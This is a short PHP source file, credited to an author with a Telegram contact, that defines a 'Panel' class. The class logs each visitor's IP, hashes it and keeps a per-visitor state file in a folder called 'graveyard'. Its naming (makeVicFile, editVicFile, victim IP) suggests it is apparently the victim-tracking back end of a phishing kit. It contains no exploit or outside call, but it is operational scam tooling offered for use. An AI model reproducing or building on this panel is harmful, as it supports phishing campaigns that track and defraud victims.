<?php

/*************************
 * AUTHOR :  SEIKO
 * CONTACT : t.me/els3iko 
**************************/


class Panel{

    public $IP = null;
    public $HASH = null;
    public $DATA_PATH = (__DIR__)."/graveyard/";

    function __construct(){
        if($_SERVER['REMOTE_ADDR']=="::1"){
            $this->IP = "127.0.0.1";
        }else{
        $this->IP = $_SERVER['REMOTE_ADDR'];
        }
        $this->makeVicFile();
    }

    function makeVicFile(){
        if(!file_exists($this->DATA_PATH. $this->getHashName($this->IP))){
            $fp = fopen($this->DATA_PATH. $this->getHashName($this->IP), "w+");
            fwrite($fp, 0);
            fclose($fp);
        }
    }

    function editVicFile($data, $vip){
        $fp = fopen($this->DATA_PATH. $this->getHashName($vip), "w+");
        fwrite($fp, $data);
        fclose($fp);
    }

    function getHashName($vip){
        $this->HASH =  substr(md5($vip), 0 , 15).".txt";
        return $this->HASH;
    }

    function getData(){
        $data = file_get_contents($this->DATA_PATH. $this->HASH);
        return $data;
    }

}




?>